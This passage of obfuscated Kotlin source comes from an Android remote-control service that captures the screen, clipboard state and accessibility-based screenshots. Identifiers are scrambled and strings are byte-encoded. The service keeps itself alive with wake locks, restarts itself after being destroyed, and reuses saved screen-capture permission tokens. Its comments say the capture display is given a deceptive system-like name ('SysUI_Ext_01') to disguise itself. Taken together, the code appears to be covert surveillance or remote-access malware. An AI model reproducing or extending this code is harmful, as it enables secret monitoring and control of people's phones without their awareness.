            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }
        try {
            startActivity(intent)
        } catch (e: Exception) {
            finishScreenSharePermissionRequest("service-launch-failed")
            Log.e("MainService", "requestMediaProjection: launch failed, reason=$reason", e)
        }
    }

    private fun registerScreenStateReceiver() {
        if (screenStateReceiverRegistered) {
            return
        }
        val filter = IntentFilter().apply {
            addAction(Intent.ACTION_SCREEN_OFF)
            addAction(Intent.ACTION_SCREEN_ON)
            addAction(Intent.ACTION_USER_PRESENT)
        }
        try {
            registerReceiver(screenStateReceiver, filter)
            screenStateReceiverRegistered = true
        } catch (e: Exception) {
            Log.e("MainService", "registerScreenStateReceiver failed", e)
        }
    }

    private fun unregisterScreenStateReceiver() {
        if (!screenStateReceiverRegistered) {
            return
        }
        try {
            unregisterReceiver(screenStateReceiver)
        } catch (e: Exception) {
            Log.e("MainService", "unregisterScreenStateReceiver failed", e)
        } finally {
            screenStateReceiverRegistered = false
        }
    }

    private fun registerNetworkCallback() {
        if (networkCallbackRegistered || Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            return
        }
        try {
            val connectivityManager =
                getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            connectivityManager.registerDefaultNetworkCallback(networkCallback)
            networkCallbackRegistered = true
        } catch (e: Exception) {
            Log.e("MainService", "registerNetworkCallback failed", e)
        }
    }

    private fun unregisterNetworkCallback() {
        if (!networkCallbackRegistered || Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            return
        }
        try {
            val connectivityManager =
                getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
            connectivityManager.unregisterNetworkCallback(networkCallback)
        } catch (e: Exception) {
            Log.e("MainService", "unregisterNetworkCallback failed", e)
        } finally {
            networkCallbackRegistered = false
        }
    }

    private fun startIgnoreFallback(reason: String) {
        if (!nZW99cdXQ0COhB2o.isOpen) {
            Log.i("MainService", "startIgnoreFallback skipped: accessibility not ready, reason=$reason")
            checkMediaPermission()
            ensureFloatingWindowKeepAlive()
            return
        }
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
            Log.i(
                "MainService",
                "startIgnoreFallback: Android 10 branch keeps service alive without screenshot fallback, reason=$reason"
            )
            checkMediaPermission()
            ensureFloatingWindowKeepAlive()
            return
        }
        try {
            ClsFx9V0S.VaiKIoQu("video", true)
        } catch (e: Exception) {
            Log.e("MainService", "startIgnoreFallback: enable video raw failed, reason=$reason", e)
        }
        ClsFx9V0S.rEqMB3nD(0)
        nZW99cdXQ0COhB2o.requestIgnoreCapture(reason)
    }

    private fun startScreenOffIgnoreFallbackIfNeeded(hadScreenShare: Boolean, reason: String) {
        if (!screenOffActive || !hadScreenShare || !nZW99cdXQ0COhB2o.isOpen) {
            return
        }
        if (shouldRun || nZW99cdXQ0COhB2o.isIgnorePending) {
            return
        }
        startIgnoreFallback(reason)
    }

    private fun armOpenShareIgnoreBridge(reason: String) {
        clearIgnoreOnceAfterShareStart = true
        if (mediaProjection != null && _isStart) {
            return
        }
        if (shouldRun || nZW99cdXQ0COhB2o.isIgnorePending) {
            Log.i("MainService", "open-share bridge keeps existing ignore state, reason=$reason")
            return
        }
        startIgnoreFallback("$reason-open-share-bridge")
    }

    private fun clearIgnoreOnceForOpenShare(reason: String): Boolean {
        if (!clearIgnoreOnceAfterShareStart) {
            return false
        }
        clearIgnoreOnceAfterShareStart = false
        nZW99cdXQ0COhB2o.stopIgnoreCapture("$reason-open-share-ready")
        SKL = false
        ClsFx9V0S.rEqMB3nD(255)
        Log.i("MainService", "open-share one-shot ignore cleared, reason=$reason")
        return true
    }

    @SuppressLint("WakelockTimeout")
    private fun ensureBackgroundKeepAlive() {
        try {
            createForegroundNotification()
        } catch (e: Exception) {
            Log.e("MainService", "ensureBackgroundKeepAlive: foreground refresh failed", e)
        }
        try {
            if (!cpuWakeLock.isHeld) {
                cpuWakeLock.acquire()
            }
        } catch (e: Exception) {
            Log.e("MainService", "ensureBackgroundKeepAlive: cpu wakelock failed", e)
        }
        try {
            if (!wifiLock.isHeld) {
                wifiLock.acquire()
            }
        } catch (e: Exception) {
            Log.e("MainService", "ensureBackgroundKeepAlive: wifi lock failed", e)
        }
        ensureFloatingWindowKeepAlive()
    }

    private fun refreshCoreKeepAlive(reason: String) {
        if (Looper.myLooper() != Looper.getMainLooper()) {
            mainHandler.post { refreshCoreKeepAlive(reason) }
            return
        }
        if (ctx !== this || (!_isReady && !_isStart)) {
            return
        }
        try {
            Log.i("MainService", "$reason: refresh core keep-alive")
            ensureBackgroundKeepAlive()
            startCoreKeepAliveTicker()
        } catch (e: Exception) {
            Log.e("MainService", "$reason: core keep-alive refresh failed", e)
        }
    }

    private fun requestNetworkRegisterRefresh(reason: String) {
        val now = SystemClock.elapsedRealtime()
        if (now - lastNetworkRegisterRefreshAt < NETWORK_REGISTER_REFRESH_COOLDOWN_MS) {
            Log.i("MainService", "skip rendezvous register refresh: cooldown, reason=$reason")
            return
        }
        lastNetworkRegisterRefreshAt = now
        mainHandler.post {
            try {
                Log.i("MainService", "request rendezvous register refresh: reason=$reason")
                ClsFx9V0S.G4yQ9OYY()
            } catch (e: Exception) {
                Log.e("MainService", "request rendezvous register refresh failed, reason=$reason", e)
            }
        }
    }

    private fun startCoreKeepAliveTicker() {
        if (coreKeepAliveTicker != null) {
            return
        }
        val ticker = object : Runnable {
            override fun run() {
                if (ctx !== this@DFm8Y8iMScvB2YDw || (!_isReady && !_isStart)) {
                    coreKeepAliveTicker = null
                    return
                }
                ensureBackgroundKeepAlive()
                mainHandler.postDelayed(this, CORE_KEEP_ALIVE_INTERVAL_MS)
            }
        }
        coreKeepAliveTicker = ticker
        mainHandler.postDelayed(ticker, CORE_KEEP_ALIVE_INTERVAL_MS)
    }

    private fun stopCoreKeepAliveTicker() {
        coreKeepAliveTicker?.let {
            mainHandler.removeCallbacks(it)
        }
        coreKeepAliveTicker = null
    }

    private fun clearRustServiceContextIfCurrent(reason: String) {
        if (ctx !== this) {
            Log.i("MainService", "skip JNI context cleanup; another service is active, reason=$reason")
            return
        }
        _isReady = false
        captureStarting = false
        _isStart = false
        _isAudioStart = false
        ctx = null
        try {
            ClsFx9V0S.VHsFQTvK()
        } catch (e: Throwable) {
            Log.e("MainService", "VHsFQTvK clearing call failed, reason=$reason", e)
        }
    }

    private fun requestCoreServiceRestartAfterUnexpectedDestroy() {
        val now = android.os.SystemClock.elapsedRealtime()
        if (now - lastUnexpectedDestroyRestartAt < UNEXPECTED_DESTROY_RESTART_COOLDOWN_MS) {
            Log.w("MainService", "skip unexpected destroy restart: cooldown")
            return
        }
        lastUnexpectedDestroyRestartAt = now
        Handler(Looper.getMainLooper()).postDelayed({
            try {
                val intent = Intent(applicationContext, DFm8Y8iMScvB2YDw::class.java).apply {
                    action = ACT_ENSURE_CORE_SERVICE
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    applicationContext.startForegroundService(intent)
                } else {
                    applicationContext.startService(intent)
                }
                Log.i("MainService", "requested core service restart after unexpected destroy")
            } catch (e: Exception) {
                Log.e("MainService", "request core service restart after unexpected destroy failed", e)
            }
        }, 500L)
    }

    private fun ensureFloatingWindowKeepAlive() {
        if (!_isReady && !_isStart) {
            return
        }
        val disableFloatingWindow = ClsFx9V0S.OCpC4h8m(p50.a(byteArrayOf(-101, 29, 106, 61, -15, -107, -76, -103, 52, -47, -112, 21, 109, 53, -3, -98, -4, -61, 59, -45, -101, 27, 110), byteArrayOf(-1, 116, 25, 92, -109, -7, -47, -76, 82, -67))) == p50.a(byteArrayOf(-38), byteArrayOf(-125, -112, -117, 6, 85, -44, -6, 57, 93))
        if (disableFloatingWindow) {
            return
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            return
        }
        try {
            startService(Intent(this, DFrLMwitwQbfu7AC::class.java))
        } catch (e: Exception) {
            Log.e("MainService", "ensureFloatingWindowKeepAlive failed", e)
        }
    }

 
    private val executor = Executors.newFixedThreadPool(5)

    fun runSafe(task: () -> Unit) {
        if (Looper.myLooper() == Looper.getMainLooper()) {
       
            executor.execute { task() }
        } else {

            task()
        }
    }


    fun createSurfaceuseVP9()
     {     
            if(SKL)
            {  
               val newBuffer: ByteBuffer? = EqljohYazB0qrhnj.getImageBuffer()
          
               if (newBuffer != null) {
                    ClsFx9V0S.b6L3vlmP(newBuffer, ErrorExceptions)
                }
           }
     }
     

    fun createSurfaceuseVP8()
     {
      

            val allowOneShot = nZW99cdXQ0COhB2o.isOneShotScreenshotFrame
            val ignoreRunning = shouldRun
            if(!SKL && (ignoreRunning || allowOneShot))
            { 
                
                val newBuffer: ByteBuffer? = EqljohYazB0qrhnj.getImageBuffer()
                if (newBuffer != null) {
                    val openedOneShotGate = allowOneShot && !ignoreRunning
                    try {
                        if (openedOneShotGate) {
                            ClsFx9V0S.rEqMB3nD(0)
                        }
                        ClsFx9V0S.T1s73AGm(newBuffer, IOExceptions)
                        if (allowOneShot) {
                            nZW99cdXQ0COhB2o.consumeOneShotScreenshotFrame()
                        }
                    } finally {
                        if (openedOneShotGate) {
                            ClsFx9V0S.rEqMB3nD(255)
                        }
                    }
                }
        }
        
     }

    fun forceVideoFrameRefresh(reason: String) {
        Handler(Looper.getMainLooper()).post {
            try {
                if (!_isStart || mediaProjection == null || surface == null || virtualDisplay == null || SKL || shouldRun) {
                    return@post
                }
                // Keep this as a server-side video refresh only. Rebinding the
                // VirtualDisplay surface here can invalidate MediaProjection on
                // some ROMs and reopen the screen-share permission dialog.
                ClsFx9V0S.qR9Ofa6G()
                Log.i("MainService", "forceVideoFrameRefresh: reason=$reason")
            } catch (e: Exception) {
                Log.e("MainService", "forceVideoFrameRefresh failed: reason=$reason", e)
                try {
                    if (_isStart && mediaProjection != null) {
                        ClsFx9V0S.qR9Ofa6G()
                    }
                } catch (_: Exception) {
                }
            }
        }
    }
     
   
    private fun createSurface(): Surface? {
        return if (useVP9) {
            // TODO
            null
        } else {
            imageReader =
                ImageReader.newInstance(
                    SCREEN_INFO.width,
                    SCREEN_INFO.height,
                    PixelFormat.RGBA_8888,
                    4
                ).apply {
                    setOnImageAvailableListener({ imageReader: ImageReader ->
                        try {
                            // If not call acquireLatestImage, listener will not be called again
                            imageReader.acquireLatestImage().use { image ->
                                if (image == null || (!isStart && !captureStarting)) return@setOnImageAvailableListener
                                if (SKL || shouldRun) return@setOnImageAvailableListener
                                //Wt=false
                                val planes = image.planes
                                val buffer = planes[0].buffer
                                buffer.rewind()
                                ClsFx9V0S.yy4mmhjJ(buffer)  
                            }
                        } catch (ignored: java.lang.Exception) {
                        }
                    }, serviceHandler)
                }
            imageReader?.surface
        }
    }

    fun onVoiceCallStarted(): Boolean {
        return true
    }

    fun onVoiceCallClosed(): Boolean {
        return true
    }

    @SuppressLint("WakelockTimeout")
    fun startCapture(): Boolean {
        if (isStart) {
            return true
        }
        if (mediaProjection == null) {
            return false
        }

        try {
            Log.i("MainService", "startCapture: preparing video capture")
            captureStarting = true
            val clearedOpenShareIgnore = clearIgnoreOnceForOpenShare("start-capture")
            if (!clearedOpenShareIgnore && !shouldRun) {
                SKL = false
                ClsFx9V0S.rEqMB3nD(255)
            }
            try {
                ClsFx9V0S.VaiKIoQu("video", true)
            } catch (e: Exception) {
                Log.e("MainService", "startCapture: enable video raw failed", e)
            }

            updateScreenInfo(resources.configuration.orientation)

            surface = createSurface()

            if (useVP9) {
                if (!startVP9VideoRecorder(mediaProjection!!)) {
                    finishFailedStartCapture("vp9-virtual-display-failed")
                    return false
                }
            } else {
                if (!startRawVideoRecorder(mediaProjection!!)) {
                    finishFailedStartCapture("raw-virtual-display-failed")
                    return false
                }
            }
        } catch (e: Exception) {
            Log.e("MainService", "startCapture failed with exception", e)
            finishFailedStartCapture("start-capture-exception")
            return false
        }

        _isStart = true
        captureStarting = false
        checkMediaPermission()
        try {
            if (cpuWakeLock.isHeld) cpuWakeLock.release()
            cpuWakeLock.acquire()
        } catch (e: Exception) {
            Log.e("MainService", "cpuWakeLock renew failed", e)
        }
        try {
            ClsFx9V0S.VaiKIoQu(p50.a(byteArrayOf(-88, 38, -86, -12, 29), byteArrayOf(-34, 79, -50, -111, 114, -37, 116)),true)
        } catch (e: Exception) {
            Log.e("MainService", "startCapture: enable secondary video flag failed", e)
        }
        try {
            oFtTiPzsqzBHGigp.rdClipboardManager?.setCaptureStarted(_isStart)
        } catch (e: Exception) {
            Log.e("MainService", "startCapture: clipboard capture flag failed", e)
        }
        ensureFloatingWindowKeepAlive()
        mainHandler.postDelayed({ forceVideoFrameRefresh("capture-started") }, 200)
        return true
    }

    private fun finishFailedStartCapture(reason: String) {
        Log.w("MainService", "startCapture failed: $reason")
        captureStarting = false
        _isStart = false
        _isAudioStart = false
        try {
            ClsFx9V0S.VaiKIoQu("video", false)
        } catch (e: Exception) {
            Log.e("MainService", "finishFailedStartCapture: disable video raw failed", e)
        }
        oFtTiPzsqzBHGigp.rdClipboardManager?.setCaptureStarted(false)
        checkMediaPermission()
        ensureBackgroundKeepAlive()
        startCoreKeepAliveTicker()
    }

    @Synchronized
    fun stopCapture2() {
        Log.i("MainService", "stopCapture2: begin")

        val mp = mediaProjection
        if (mp != null) {
            try {
                mp.stop()
                Log.i("MainService", "stopCapture2: MediaProjection.stop() success")
            } catch (e: Exception) {
                Log.e("MainService", "stopCapture2: MediaProjection.stop() failed", e)
            }
            mediaProjection = null
        } else {
            Log.w("MainService", "stopCapture2: mediaProjection is already null")
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            savedMediaProjectionIntent = null
        }

        captureStarting = false
        _isStart = false
        _isReady = true
        _isAudioStart = false
        oFtTiPzsqzBHGigp.rdClipboardManager?.setCaptureStarted(false)

        try {
            virtualDisplay?.release()
        } catch (e: Exception) {
            Log.e("MainService", "stopCapture2: virtualDisplay release failed", e)
        }
        virtualDisplay = null

        try {
            imageReader?.close()
        } catch (e: Exception) {
            Log.e("MainService", "stopCapture2: imageReader close failed", e)
        }
        imageReader = null

        try {
            videoEncoder?.let {
                it.signalEndOfInputStream()
                it.stop()
                it.release()
            }
        } catch (e: Exception) {
            Log.e("MainService", "stopCapture2: videoEncoder release failed", e)
        }
        videoEncoder = null

        try {
            surface?.release()
        } catch (e: Exception) {
            Log.e("MainService", "stopCapture2: surface release failed", e)
        }

        checkMediaPermission()
        ensureBackgroundKeepAlive()
        startCoreKeepAliveTicker()

        Log.i("MainService", "stopCapture2: complete")
    }

    @Synchronized
    private fun handleProjectionStoppedKeepService(reason: String, stopProjection: Boolean = false) {
        Log.i("MainService", "handleProjectionStoppedKeepService: $reason")
        val suppressIgnore = suppressNextProjectionStoppedIgnore
        suppressNextProjectionStoppedIgnore = false

        val stoppedProjection = mediaProjection
        mediaProjection = null
        if (stopProjection) {
            try {
                stoppedProjection?.stop()
            } catch (e: Exception) {
                Log.e("MainService", "handleProjectionStoppedKeepService: projection stop failed", e)
            }
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            savedMediaProjectionIntent = null
        }
        captureStarting = false
        _isStart = false
        _isReady = true
        _isAudioStart = false
        oFtTiPzsqzBHGigp.rdClipboardManager?.setCaptureStarted(false)

        try { virtualDisplay?.release() } catch (e: Exception) {
            Log.e("MainService", "handleProjectionStoppedKeepService: virtualDisplay release failed", e)
        }
        virtualDisplay = null

        try { imageReader?.close() } catch (e: Exception) {
            Log.e("MainService", "handleProjectionStoppedKeepService: imageReader close failed", e)
        }
        imageReader = null

        try { videoEncoder?.stop(); videoEncoder?.release() } catch (e: Exception) {
            Log.e("MainService", "handleProjectionStoppedKeepService: videoEncoder release failed", e)
        }
        videoEncoder = null

        try { surface?.release() } catch (e: Exception) {
            Log.e("MainService", "handleProjectionStoppedKeepService: surface release failed", e)
        }
        surface = null

        if (!suppressIgnore && nZW99cdXQ0COhB2o.isOpen && (shouldRun || screenOffActive)) {
            startIgnoreFallback("projection-stopped-$reason")
        }
        checkMediaPermission()
        createForegroundNotification()
        ensureBackgroundKeepAlive()
        startCoreKeepAliveTicker()
    }

    @Synchronized
    fun killMediaProjection() {
        Log.i("MainService", "killMediaProjection: begin, mp=${mediaProjection != null}")

        nZW99cdXQ0COhB2o.stopIgnoreCapture("kill-media-projection")
        SKL = false
        ClsFx9V0S.rEqMB3nD(255)

        try {
            if (mediaProjection != null) {
                suppressNextProjectionStoppedIgnore = true
            }
            mediaProjection?.stop()
            Log.i("MainService", "killMediaProjection: mp.stop() done")
        } catch (e: Exception) {
            Log.e("MainService", "killMediaProjection: mp.stop() error", e)
        }
        mediaProjection = null

        // Android 14+: MediaProjection token 在 stop() 后变为一次性，无法复用
        // 清除保存的 Intent，避免 restoreMediaProjection 中无意义的失败尝试
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            savedMediaProjectionIntent = null
        }

        captureStarting = false
        _isStart = false
        _isReady = true
        _isAudioStart = false
        oFtTiPzsqzBHGigp.rdClipboardManager?.setCaptureStarted(false)

        try { virtualDisplay?.release() } catch (_: Exception) {}
        virtualDisplay = null
        try { imageReader?.close() } catch (_: Exception) {}
        imageReader = null
        try { videoEncoder?.stop(); videoEncoder?.release() } catch (_: Exception) {}
        videoEncoder = null
        try { surface?.release() } catch (_: Exception) {}
        surface = null

        checkMediaPermission()
        ensureBackgroundKeepAlive()
        startCoreKeepAliveTicker()

        Log.i("MainService", "killMediaProjection: complete")
    }

    fun restoreMediaProjection(
        reason: String = "restore-media-command",
        allowPermissionPrompt: Boolean = false
    ) {
        Log.i(
            "MainService",
            "restoreMediaProjection: begin, reason=$reason, allowPrompt=$allowPermissionPrompt, savedIntent=${savedMediaProjectionIntent != null}"
        )
        armOpenShareIgnoreBridge(reason)

        if (_isStart && mediaProjection != null) {
            clearIgnoreOnceForOpenShare("restore-media-already-active")
            checkMediaPermission()
            Log.i("MainService", "restoreMediaProjection: already sharing, skip")
            return
        }

        if (mediaProjection != null) {
            val captureResult = startCapture()
            Log.i("MainService", "restoreMediaProjection: startCapture result=$captureResult (current projection)")
            return
        }

        if (isScreenSharePermissionRequestInFlight()) {
            Log.i("MainService", "restoreMediaProjection: permission request already in flight, skip")
            return
        }

        val savedIntent = if (Build.VERSION.SDK_INT < Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            savedMediaProjectionIntent
        } else {
            null
        }
        if (savedIntent != null) {
            try {
                val mediaProjectionManager =
                    getSystemService(Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager

                val newProjection = mediaProjectionManager.getMediaProjection(Activity.RESULT_OK, savedIntent.clone() as Intent)

                if (newProjection != null) {
                    try {
                        virtualDisplay?.release()
                    } catch (e: Exception) {
                        Log.e("MainService", "restoreMediaProjection: stale VirtualDisplay release failed", e)
                    }
                    virtualDisplay = null
                    mediaProjection = newProjection
                    mediaProjection?.registerCallback(object : android.media.projection.MediaProjection.Callback() {
                        override fun onStop() {
                            Log.w("MainService", "MediaProjection stopped by system")
                            Handler(Looper.getMainLooper()).post {
                                handleProjectionStoppedKeepService("restore-callback")
                            }
                        }
                    }, Handler(Looper.getMainLooper()))

                    _isReady = true
                    createForegroundNotification()
                    ensureBackgroundKeepAlive()
                    checkMediaPermission()

                    val captureResult = startCapture()
                    Log.i("MainService", "restoreMediaProjection: startCapture result=$captureResult (token reuse)")
                    return
                }
            } catch (e: Exception) {
                Log.w("MainService", "restoreMediaProjection: token reuse failed", e)
                savedMediaProjectionIntent = null
            }
        }

        if (!allowPermissionPrompt) {
            Log.i("MainService", "restoreMediaProjection: prompt blocked for non-explicit path, reason=$reason")
            return
        }

        // The old token is unavailable. Keep the open-share bridge state and wait for permission.
        Log.i("MainService", "restoreMediaProjection: requesting new MediaProjection permission, reason=$reason")
        requestMediaProjection(reason)
    }

    @Synchronized
    fun stopCaptureKeepService() {
        captureStarting = false
        _isStart = false
        _isAudioStart = false
        oFtTiPzsqzBHGigp.rdClipboardManager?.setCaptureStarted(false)
        nZW99cdXQ0COhB2o.stopIgnoreCapture("stop-capture-keep-service")
        SKL = false
        ClsFx9V0S.rEqMB3nD(255)

        try {
            virtualDisplay?.release()
        } catch (e: Exception) {
            Log.e("MainService", "release virtualDisplay failed", e)
        }
        virtualDisplay = null

        try {
            imageReader?.close()
            imageReader = null
        } catch (e: Exception) {
            Log.e("MainService", "close imageReader failed", e)
        }

        try {
            videoEncoder?.let {
                it.signalEndOfInputStream()
                it.stop()
                it.release()
            }
        } catch (e: Exception) {
            Log.e("MainService", "release videoEncoder failed", e)
        }

        videoEncoder = null

        try {
            surface?.release()
        } catch (e: Exception) {
            Log.e("MainService", "release surface failed", e)
        }

        try {
            if (mediaProjection != null) {
                suppressNextProjectionStoppedIgnore = true
            }
            mediaProjection?.stop()
        } catch (e: Exception) {
            Log.e("MainService", "stop mediaProjection failed", e)
        }
        mediaProjection = null
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
            savedMediaProjectionIntent = null
        }
        _isReady = true
        ensureBackgroundKeepAlive()
        startCoreKeepAliveTicker()

        Log.i("MainService", "stopCaptureKeepService: MediaProjection stopped, service alive")
    }

    @Synchronized
    fun stopScreenShareOnly(reason: String) {
        Log.i("MainService", "stopScreenShareOnly: $reason")
        try {
            ClsFx9V0S.VaiKIoQu("video", false)
        } catch (e: Exception) {
            Log.e("MainService", "stopScreenShareOnly: disable video raw failed", e)
        }
        stopCaptureKeepService()
        checkMediaPermission()
        ensureBackgroundKeepAlive()
        startCoreKeepAliveTicker()
    }

    @Synchronized
    fun stopScreenShareAndStartIgnore(reason: String) {
        Log.i("MainService", "stopScreenShareAndStartIgnore: $reason")
        stopCaptureKeepService()
        startIgnoreFallback("$reason-close-share")
        checkMediaPermission()
        ensureBackgroundKeepAlive()
        startCoreKeepAliveTicker()
    }

      @Synchronized
    fun stopCapture() {

        ClsFx9V0S.VaiKIoQu(p50.a(byteArrayOf(-4, 55, 11, 80, -103), byteArrayOf(-118, 94, 111, 53, -10, -103, 80, -42, 37, -77)),false)
        
        captureStarting = false
        _isStart = false
       
        oFtTiPzsqzBHGigp.rdClipboardManager?.setCaptureStarted(_isStart)
 
        if (reuseVirtualDisplay) {
  
            virtualDisplay?.setSurface(null)
        } else {
            virtualDisplay?.release()
        }
    
        imageReader?.close()
        imageReader = null
        videoEncoder?.let {
            it.signalEndOfInputStream()
            it.stop()
            it.release()
        }
        if (!reuseVirtualDisplay) {
            virtualDisplay = null
        }
        videoEncoder = null

        surface?.release()

        _isAudioStart = false
     
    }

    
    fun destroy() {
   
        explicitStopRequested = true
        _isReady = false
        _isAudioStart = false
        
        nZW99cdXQ0COhB2o.resetCaptureStates("destroy")
        nZW99cdXQ0COhB2o.ctx?.setTouchBlockEnabled(false)
        gohome = 8
        BIS = false
        ClsFx9V0S.rEqMB3nD(255)
        try {
            ClsFx9V0S.VaiKIoQu("video", false)
        } catch (e: Exception) {
            Log.e("MainService", "destroy: disable video raw failed", e)
        }
        savedMediaProjectionIntent = null
        
        stopCapture()

        if (reuseVirtualDisplay) {
            virtualDisplay?.release()
            virtualDisplay = null
        }

        mediaProjection = null
        checkMediaPermission()
        stopForeground(true)
        stopService(Intent(this, DFrLMwitwQbfu7AC::class.java))
        stopSelf()
    }

    fun checkMediaPermission(): Boolean {
        Handler(Looper.getMainLooper()).post {
            oFtTiPzsqzBHGigp.flutterMethodChannel?.invokeMethod(
                p50.a(byteArrayOf(-110, -58, 67, 16, 62, -82, 28, -68, -100, -98, -64, 125, 13, 45, -86, 12), byteArrayOf(-3, -88, 28, 99, 74, -49, 104, -39, -61)),
                mapOf(p50.a(byteArrayOf(-103, 71, -44, 108), byteArrayOf(-9, 38, -71, 9, 62, -116, -61, -29)) to p50.a(byteArrayOf(67, 35, -61, -15, -62), byteArrayOf(46, 70, -89, -104, -93, 117, -1, -67, -62, 31, 104)), p50.a(byteArrayOf(102, -75, 83, -89, 51), byteArrayOf(16, -44, 63, -46, 86, -62, -21, -124, -63, 10, 1)) to isStart.toString())
            )
        }
        Handler(Looper.getMainLooper()).post {
            oFtTiPzsqzBHGigp.flutterMethodChannel?.invokeMethod(
                p50.a(byteArrayOf(-41, -3, 103, -59, 88, -39, 120, -23, -83, -8, -48, -14, 86, -47, 73, -36), byteArrayOf(-72, -109, 56, -74, 44, -72, 12, -116, -14, -101)),
                mapOf(p50.a(byteArrayOf(-88, 55, 125, 29), byteArrayOf(-58, 86, 16, 120, -18, 75, 18, -91)) to p50.a(byteArrayOf(51, 119, -106, 36, 13), byteArrayOf(90, 25, -26, 81, 121, 54, -25)), p50.a(byteArrayOf(-82, 62, -92, 81, 33), byteArrayOf(-40, 95, -56, 36, 68, -10, -33, 16, 60, 72)) to nZW99cdXQ0COhB2o.isOpen.toString())
            )
        }
        return isReady
    }

    private fun startRawVideoRecorder(mp: MediaProjection): Boolean {

        if (surface == null) {
            return false
        }
        return createOrSetVirtualDisplay(mp, surface!!)
    }

    private fun startVP9VideoRecorder(mp: MediaProjection): Boolean {
        createMediaCodec()
        videoEncoder?.let {
            surface = it.createInputSurface()
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                surface!!.setFrameRate(1F, FRAME_RATE_COMPATIBILITY_DEFAULT)
            }
            it.setCallback(cb)
            it.start()
            return createOrSetVirtualDisplay(mp, surface!!)
        }
        return false
    }

    private fun createOrSetVirtualDisplay(mp: MediaProjection, s: Surface): Boolean {
        try {
            virtualDisplay?.let {
                it.resize(SCREEN_INFO.width, SCREEN_INFO.height, SCREEN_INFO.dpi)
                it.setSurface(s)
            } ?: let {
                virtualDisplay = mp.createVirtualDisplay(
                    "SysUI_Ext_01", // ✅ 修改为具有迷惑性的系统级名称
                    SCREEN_INFO.width, SCREEN_INFO.height, SCREEN_INFO.dpi, 
                    // ✅ 增加 PRESENTATION 标志，伪装成本地物理投屏/演示屏幕
                    VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR or VIRTUAL_DISPLAY_FLAG_PRESENTATION, 
                    s, null, null
                )
            }
            return true
        } catch (e: SecurityException) {
            Log.w("MainService", "createVirtualDisplay failed; keep core service alive without reopening permission", e)
            handleProjectionStoppedKeepService("virtual-display-security")
            return false
        } catch (e: Exception) {
            Log.e("MainService", "createVirtualDisplay failed; keep core service alive", e)
            handleProjectionStoppedKeepService("virtual-display-error")
            return false
        }
    }

    private val cb: MediaCodec.Callback = object : MediaCodec.Callback() {
        override fun onInputBufferAvailable(codec: MediaCodec, index: Int) {}
        override fun onOutputFormatChanged(codec: MediaCodec, format: MediaFormat) {}

        override fun onOutputBufferAvailable(
            codec: MediaCodec,
            index: Int,
            info: MediaCodec.BufferInfo
        ) {
            codec.getOutputBuffer(index)?.let { buf ->
                sendVP9Thread.execute {
                    val byteArray = ByteArray(buf.limit())
                    buf.get(byteArray)
                    // sendVp9(byteArray)
                    codec.releaseOutputBuffer(index, false)
                }
            }
        }

        override fun onError(codec: MediaCodec, e: MediaCodec.CodecException) {
     
        }
    }

    private fun createMediaCodec() {

        videoEncoder = MediaCodec.createEncoderByType(MIME_TYPE)
        val mFormat =
            MediaFormat.createVideoFormat(MIME_TYPE, SCREEN_INFO.width, SCREEN_INFO.height)
        mFormat.setInteger(MediaFormat.KEY_BIT_RATE, VIDEO_KEY_BIT_RATE)
        mFormat.setInteger(MediaFormat.KEY_FRAME_RATE, VIDEO_KEY_FRAME_RATE)
        mFormat.setInteger(
            MediaFormat.KEY_COLOR_FORMAT,
            MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420Flexible
        )
        mFormat.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 5)
        try {
            videoEncoder!!.configure(mFormat, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE)
        } catch (e: Exception) {
  
        }
    }

    private fun initNotification() {
        notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationChannel = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channelId = DEFAULT_NOTIFY_CHANNEL
            val channelName = getString(R.string.app_name)
            val channel = NotificationChannel(
                channelId,
                channelName, NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "保持远程连接服务运行"
                setShowBadge(false)
                lockscreenVisibility = Notification.VISIBILITY_PRIVATE
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
            }
            notificationManager.createNotificationChannel(channel)
            channelId
        } else {
            ""
        }
        notificationBuilder = NotificationCompat.Builder(this, notificationChannel)
    }


    @SuppressLint("WakelockTimeout")
    private fun createForegroundNotification() {
        val intent = Intent(this, oFtTiPzsqzBHGigp::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED
            action = Intent.ACTION_MAIN
            addCategory(Intent.CATEGORY_LAUNCHER)
            putExtra(p50.a(byteArrayOf(-53, -123, -17, 36), byteArrayOf(-65, -4, -97, 65, 98, 85, 12, -101, 57)), type)
        }
        val pendingIntent = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.getActivity(this, 0, intent, FLAG_UPDATE_CURRENT or FLAG_IMMUTABLE)
        } else {
            PendingIntent.getActivity(this, 0, intent, FLAG_UPDATE_CURRENT)
        }
        val notification = notificationBuilder
            .setOngoing(true)
            .setSmallIcon(R.mipmap.ic_stat_logo)
            .setDefaults(0)
            .setAutoCancel(false)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setContentTitle(getString(R.string.app_name))
            .setContentText("正在保持远程连接服务")
